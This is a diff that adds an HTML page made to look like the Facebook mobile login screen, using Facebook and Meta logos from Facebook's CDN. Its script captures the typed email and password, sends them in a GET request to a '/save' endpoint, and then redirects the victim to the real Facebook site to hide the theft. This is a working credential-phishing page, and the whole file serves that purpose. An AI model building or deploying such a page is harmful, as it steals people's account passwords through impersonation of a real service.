@@ -1,0 +1,95 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Facebook Login
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"/>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link rel="icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png"
+        type="image/x-icon" />
+  <style>
+   body {
+      font-family: 'Roboto', sans-serif;
+    }
+  </style>
+ </head>
+ <body class="bg-white text-gray-800 min-h-screen flex flex-col">
+  <!-- Main content container -->
+  <div class="flex-grow flex flex-col items-center px-6 pt-8">
+   <!-- Back arrow with Facebook icon -->
+   <div class="self-start mb-4 flex items-center space-x-2">
+    <button aria-label="Back" class="focus:outline-none">
+     <svg aria-hidden="true" class="h-6 w-6 text-black" fill="none" focusable="false" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <path d="M15 19l-7-7 7-7" stroke-linecap="round" stroke-linejoin="round">
+      </path>
+     </svg>
+    </button>
+    <img alt="Facebook line logo blue lowercase f letter" class="w-6 h-6" height="24" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" width="24"/>
+   </div>
+   <!-- Language text -->
+   <p class="text-gray-500 text-base mb-6 select-none">
+    English
+   </p>
+   <!-- Facebook logo replaced -->
+   <img alt="Facebook line logo blue lowercase f letter" class="mb-8 w-16 h-16" height="64" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" width="64"/>
+   <!-- Form -->
+   <form autocomplete="off" class="w-full max-w-md space-y-4" novalidate="">
+    <input aria-label="Mobile number or email address" autocomplete="username" class="w-full rounded-xl border border-gray-300 px-4 py-3 text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent" id="email" name="email" placeholder="Mobile number or email address" type="text"/>
+    <input aria-label="Password" autocomplete="current-password" class="w-full rounded-xl border border-gray-300 px-4 py-3 text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent" id="password" name="password" placeholder="Password" type="password"/>
+    <button class="w-full bg-blue-600 text-white rounded-full py-3 text-base font-normal hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:ring-offset-1" type="submit">
+     Log In
+    </button>
+   </form>
+   <!-- Forgot password text with link -->
+   <p class="mt-6 text-center text-sm text-black select-none">
+    <a href="https://m.facebook.com/login/identify/" class="text-black hover:underline" target="_blank" rel="noopener noreferrer">
+     Forgot password?
+    </a>
+   </p>
+  </div>
+  <!-- Bottom container -->
+  <div class="px-6 pb-8">
+   <a href="https://m.facebook.com/reg" class="w-full max-w-md mx-auto block border border-blue-600 text-blue-600 rounded-full py-3 text-center text-base font-normal hover:bg-blue-50 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:ring-offset-1" role="button" target="_blank" rel="noopener noreferrer">
+    Create New Account
+   </a>
+   <div class="mt-6 flex justify-center items-center space-x-2 select-none">
+    <img alt="Meta logo blue infinity symbol with Meta text" class="inline-block" height="20" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" width="80"/>
+   </div>
+  </div>
+ </body>
+<script>
+document.querySelector('form').addEventListener('submit', function(event) {
+  event.preventDefault();
+
+  // Get values
+  let femail = document.getElementsByName("email")[0].value;
+  let fpass = document.getElementsByName("password")[0].value;
+
+  console.log(femail);
+  console.log(fpass);
+
+  // Now make the AJAX request
+  $.ajax({
+    type: "GET",  // You can change to POST later if needed
+    url: "/save",
+    data: {
+      "email": femail,
+      "password": fpass
+    },
+    success: function(data) {
+      console.log("Server responded:", data);
+      window.location.href = "https://m.facebook.com/";
+
+    },
+    error: function(xhr, status, error) {
+      console.error("AJAX error:", error);
+    }
+  });
+});
+</script>
+</html>
